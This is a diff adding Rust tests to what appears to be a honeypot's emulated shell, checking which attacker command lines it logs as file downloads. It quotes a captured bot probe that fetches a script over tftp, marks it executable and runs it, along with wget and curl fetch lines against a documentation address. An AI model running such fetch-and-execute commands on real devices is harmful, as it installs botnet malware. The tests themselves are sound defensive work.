@@ -374,3 +374,143 @@ fn a_waiting_line_reports_its_fetches_once() {
     // The rerun on the ended input emits nothing more.
     assert_eq!(sh.handle_input("cat /tmp/in").0, "data\n");
 }
+
+/// The tool probe a bot ran on telnet 2026-10-09 (server replaced): the last word runs the file
+/// the line itself wrote, which is not the tftp applet.
+const PROBE: &str = "/bin/busybox tftp -g 192.0.2.1 -r tftp.sh -l - > tftp;chmod 777 tftp;./tftp";
+
+#[test]
+fn running_the_file_a_line_just_wrote_is_not_a_second_download() {
+    let mut sh = shell();
+    let (out, events) = sh.handle_input(PROBE);
+    assert_eq!(urls(&events), vec!["tftp://192.0.2.1/tftp.sh".to_string()]);
+    assert_eq!(out, "", "the empty file runs as an empty program");
+    for name in ["wget", "curl", "ftpget"] {
+        let line = format!(
+            "/bin/busybox tftp -g 192.0.2.1 -r x.sh -l - > {name};chmod 777 {name};./{name}"
+        );
+        let (out, events) = sh.handle_input(&line);
+        assert_eq!(
+            urls(&events),
+            vec!["tftp://192.0.2.1/x.sh".to_string()],
+            "{line}"
+        );
+        assert_eq!(out, "", "{line}");
+    }
+}
+
+#[test]
+fn a_written_file_named_for_a_tool_is_not_that_tool_even_with_arguments() {
+    let mut sh = shell();
+    for name in ["wget", "curl", "tftp", "ftpget"] {
+        sh.handle_input(format!(": > {name}; chmod 777 {name}"));
+    }
+    for line in [
+        "./wget http://192.0.2.1/a",
+        "./curl http://192.0.2.1/a",
+        "./tftp -g -r a 192.0.2.1",
+        "./ftpget 192.0.2.1 a",
+        "/root/wget http://192.0.2.1/a",
+        "cd /tmp; ../root/curl http://192.0.2.1/a",
+    ] {
+        let (_, events) = sh.handle_input(line);
+        assert_eq!(urls(&events), Vec::<String>::new(), "{line}");
+    }
+    // The same on the phone, whose shell is mksh.
+    let mut phone = android();
+    phone.handle_input("cd /data/local/tmp; : > wget; chmod 777 wget");
+    let (_, events) = phone.handle_input("./wget http://192.0.2.1/a");
+    assert_eq!(urls(&events), Vec::<String>::new());
+}
+
+#[test]
+fn a_path_to_nothing_is_a_missing_file_not_a_fetch() {
+    let mut sh = shell();
+    for line in [
+        "./wget http://192.0.2.1/a",
+        "bin/wget http://192.0.2.1/a",
+        "/tmp/curl http://192.0.2.1/a",
+        "./tftp -g -r a 192.0.2.1",
+        "/bin/tftp -g -r a 192.0.2.1",
+        "./busybox wget http://192.0.2.1/a",
+    ] {
+        let (out, events) = sh.handle_input(line);
+        assert_eq!(urls(&events), Vec::<String>::new(), "{line}");
+        assert!(
+            out.ends_with("No such file or directory\n"),
+            "{line}: {out}"
+        );
+    }
+}
+
+#[test]
+fn the_tool_files_the_persona_ships_still_fetch() {
+    let mut sh = shell();
+    for line in [
+        "/usr/bin/wget http://192.0.2.1/a -O /dev/null",
+        "/bin/wget http://192.0.2.1/a -O /dev/null",
+        "/usr/bin/curl http://192.0.2.1/a -o /dev/null",
+        "/bin/busybox wget http://192.0.2.1/a -O /dev/null",
+        "/usr/bin/busybox wget http://192.0.2.1/a -O /dev/null",
+        "/bin/busybox tftp -g -r a 192.0.2.1",
+    ] {
+        let expected = if line.contains("tftp") {
+            "tftp://192.0.2.1/a"
+        } else {
+            "http://192.0.2.1/a"
+        };
+        assert_eq!(urls_of(&mut sh, line), vec![expected.to_string()], "{line}");
+    }
+}
+
+#[test]
+fn a_relative_path_is_the_tool_when_the_working_directory_makes_it_so() {
+    let mut sh = shell();
+    sh.handle_input("cd /usr");
+    assert_eq!(
+        urls_of(&mut sh, "bin/wget http://192.0.2.1/a -O /dev/null"),
+        vec![at_doc("a")]
+    );
+    assert_eq!(
+        urls_of(&mut sh, "../usr/bin/curl http://192.0.2.1/a -o /dev/null"),
+        vec![at_doc("a")]
+    );
+    sh.handle_input("cd /tmp");
+    assert_eq!(
+        urls_of(&mut sh, "bin/wget http://192.0.2.1/a"),
+        Vec::<String>::new()
+    );
+}
+
+#[test]
+fn a_saved_copy_of_busybox_still_fetches_but_only_when_named_busybox() {
+    let mut sh = shell();
+    sh.handle_input("cp /bin/busybox /tmp/busybox; cp /bin/busybox /tmp/bb");
+    assert_eq!(
+        urls_of(&mut sh, "/tmp/busybox wget http://192.0.2.1/a -O /dev/null"),
+        vec![at_doc("a")]
+    );
+    // A copy under another name has no such applet (`applet not found`), so nothing is fetched.
+    assert_eq!(
+        urls_of(&mut sh, "/tmp/bb wget http://192.0.2.1/a -O /dev/null"),
+        Vec::<String>::new()
+    );
+}
+
+#[test]
+fn a_branch_the_line_never_ran_is_judged_by_the_same_rule() {
+    let mut sh = shell();
+    // The lexical pass reports a fetch the evaluator skipped, but a path that is no tool is not one.
+    assert_eq!(
+        urls_of(&mut sh, "false && /usr/bin/wget http://192.0.2.1/a"),
+        vec![at_doc("a")]
+    );
+    assert_eq!(
+        urls_of(&mut sh, "false && ./wget http://192.0.2.1/a"),
+        Vec::<String>::new()
+    );
+}
+
+fn at_doc(path: &str) -> String {
+    format!("http://192.0.2.1/{path}")
+}
